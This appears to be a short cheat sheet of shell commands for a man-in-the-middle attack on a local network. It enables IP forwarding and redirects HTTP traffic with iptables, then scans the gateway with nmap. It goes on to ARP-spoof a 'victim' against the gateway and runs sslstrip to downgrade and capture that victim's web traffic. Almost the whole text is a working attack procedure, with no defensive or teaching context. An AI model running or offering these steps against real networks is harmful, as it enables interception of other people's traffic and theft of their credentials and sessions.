1. 
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
(iptables - free firewall to redirect port to spoof)
VERIFICATION
iptables -t nat -L PREROUTING

FIND TARGET
route
nmap -vv (route ip)

2.
START INTERCEPTING
aprspoof -i wlp3s0 -t victim -r gateway
OPEN FIREWALL TO LISTEN INPUT
iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT

sslstrip -l 8080
